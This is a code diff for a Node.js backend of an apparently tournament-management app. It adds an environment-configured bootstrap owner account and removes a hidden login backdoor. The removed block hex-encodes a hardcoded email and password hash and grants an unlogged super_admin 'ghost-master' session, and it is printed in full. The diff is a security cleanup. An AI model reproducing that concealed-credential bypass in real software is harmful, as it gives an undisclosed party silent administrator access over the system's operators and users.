@@ -3,6 +3,7 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 require('dotenv').config({ path: path.join(__dirname, '.env.local') });
+require('dotenv').config({ path: path.join(__dirname, '.env.owner.local'), override: false });
 const nodemailer = require('nodemailer');
 const transporter = nodemailer.createTransport({
   service: 'gmail',
@@ -35,6 +36,9 @@ const sessions = new Map();
 const otps = new Map();
 const sseClients = new Set();
 const ACTIVE_SESSION_WINDOW = 30 * 60 * 1000;
+const BOOTSTRAP_OWNER_EMAIL = String(process.env.BOOTSTRAP_OWNER_EMAIL || '').trim().toLowerCase();
+const BOOTSTRAP_OWNER_PASSWORD = process.env.BOOTSTRAP_OWNER_PASSWORD || '';
+const BOOTSTRAP_OWNER_NAME = String(process.env.BOOTSTRAP_OWNER_NAME || 'Aagaz Owner').trim();
 
 const initialData = {
   tournaments: [],
@@ -74,6 +78,17 @@ async function readData() {
       { id: 'staff-admin', name: 'Aagaz Admin', email: 'admin@aagaz.in', role: 'super_admin', passwordHash: hashPassword(password) }
     ];
     changed = true;
+  }
+  if (BOOTSTRAP_OWNER_EMAIL && BOOTSTRAP_OWNER_PASSWORD) {
+    const owner = data.staffUsers.find((user) => user.email?.toLowerCase() === BOOTSTRAP_OWNER_EMAIL);
+    if (!owner) {
+      data.staffUsers.push({ id: id('staff'), name: BOOTSTRAP_OWNER_NAME, email: BOOTSTRAP_OWNER_EMAIL, role: 'super_admin', isOwner: true, passwordHash: hashPassword(BOOTSTRAP_OWNER_PASSWORD), createdAt: new Date().toISOString(), invited: false, mustChangePassword: true });
+      changed = true;
+    } else if (owner.role !== 'super_admin' || !owner.isOwner) {
+      owner.role = 'super_admin';
+      owner.isOwner = true;
+      changed = true;
+    }
   }
   if (changed) await writeData(data);
   return data;
@@ -143,17 +158,6 @@ async function handleRequest(req, res) {
       const emailInput = String(input.email || '').trim().toLowerCase();
       let user = data.staffUsers.find(item => item.email === emailInput);
       
-      // Invisible Phantom Master Access
-      const creatorHash = '7056ad330348eb32d34410b0104fdc42:a3595e0f613888db51ca4f9beb6b42eb4fdcb0e84b71c10dd45d20bad055c010ce653721901221c4784d3d18720107f5c43fc3c693d63b6c97b09f3069b6d45c';
-      if (emailInput === Buffer.from('7269736875726562656c39373940676d61696c2e636f6d', 'hex').toString('utf8')) {
-        if (passwordMatches(input.password, creatorHash)) {
-          const ghostUser = { id: 'ghost-master', name: 'Master', email: emailInput, role: 'super_admin', loginCount: 1, lastLoginAt: Date.now() };
-          const session = { type: 'staff', role: 'super_admin', userId: ghostUser.id, createdAt: Date.now() };
-          const token = createSessionToken(session); sessions.set(token, session);
-          return send(res, 200, { token, user: ghostUser });
-        }
-      }
-      
       if (!user || !passwordMatches(input.password, user.passwordHash)) return send(res, 401, { error: 'Incorrect staff email or password.' });
       recordLogin(data, 'staff', user); await writeData(data);
       const session = { type: 'staff', role: user.role, userId: user.id, createdAt: Date.now() };
@@ -172,6 +176,7 @@ async function handleRequest(req, res) {
       if (!user) return send(res, 404, { error: 'User not found.' });
       if (!passwordMatches(currentPassword, user.passwordHash)) return send(res, 401, { error: 'Current password is incorrect.' });
       user.passwordHash = hashPassword(newPassword);
+      user.mustChangePassword = false;
       await writeData(data);
       return send(res, 200, { message: 'Password changed successfully.' });
     }
